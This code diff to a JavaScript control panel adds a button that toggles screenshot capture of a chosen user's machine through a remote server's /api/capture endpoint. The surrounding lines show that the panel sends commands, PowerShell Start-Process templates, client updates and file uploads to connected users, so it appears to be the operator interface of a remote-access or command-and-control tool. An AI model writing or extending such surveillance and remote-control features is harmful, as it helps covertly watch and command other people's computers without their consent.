@@ -358,6 +358,13 @@ const RunApp = (() => {
         setPill('shell-summary-ps', true);
         setPill('shell-summary-upload', runState.cmdLoadedFromUpload);
 
+        const screenshotBtn = $('enable-screenshot-btn');
+        if (screenshotBtn) {
+            const isCapturing = !!runState.popupUser?.capture;
+            screenshotBtn.textContent = isCapturing ? 'disable screenshot' : 'enable screenshot';
+            screenshotBtn.classList.toggle('active', isCapturing);
+        }
+
         const vol = $('spk-volume'), spd = $('spk-speed');
         if (vol) vol.value = String(runState.selectedSpkVolume);
         if (spd) spd.value = String(runState.selectedSpkSpeed);
@@ -513,7 +520,6 @@ Start-Process $o`;
         const user = runState.popupUser;
         if (!user) return;
         if (!runState.isConnected || user.demo) {
-            closePopup();
             alert('Demo mode: action preview only. Connect to send real commands.');
             return;
         }
@@ -538,7 +544,6 @@ Start-Process $o`;
                 body: JSON.stringify(body)
             });
             if (!res.ok) throw new Error('Failed to send command');
-            closePopup();
             fetchData();
         } catch (e) {
             alert('Failed to send update command.');
@@ -548,6 +553,41 @@ Start-Process $o`;
                 btn.disabled = false;
                 btn.textContent = 'update client';
             }
+        }
+    }
+
+    async function doToggleEnableScreenshot() {
+        if (isSendingCommand) return;
+        const user = runState.popupUser;
+        if (!user) return;
+        if (!runState.isConnected || user.demo) {
+            alert('Demo mode: action preview only. Connect to send real commands.');
+            return;
+        }
+
+        const nextCapture = !user.capture;
+        const btn = $('enable-screenshot-btn');
+        if (btn) {
+            btn.disabled = true;
+            btn.textContent = 'updating...';
+        }
+
+        try {
+            const res = await fetch(`${VPS_URL}/api/capture`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'x-password': runState.password },
+                body: JSON.stringify({ username: user.username, capture: nextCapture })
+            });
+            if (!res.ok) throw new Error('Failed to set capture');
+            user.capture = nextCapture;
+            const targetInRows = runState.rows.find(r => r.username === user.username);
+            if (targetInRows) targetInRows.capture = nextCapture;
+            updateOptionsUI();
+            fetchData();
+        } catch (e) {
+            alert('Failed to toggle screenshot capture.');
+        } finally {
+            if (btn) btn.disabled = false;
         }
     }
 
@@ -776,6 +816,7 @@ Start-Process $o`;
         $('vis-false').onclick = () => setPopupVisibility(false);
         $('upload-btn').onclick = () => $('file-upload').click();
         $('update-client-btn')?.addEventListener('click', doSendUpdateClient);
+        $('enable-screenshot-btn')?.addEventListener('click', doToggleEnableScreenshot);
 
         $('file-upload').onchange = e => {
             const file = e.target.files[0]; if (!file) return;
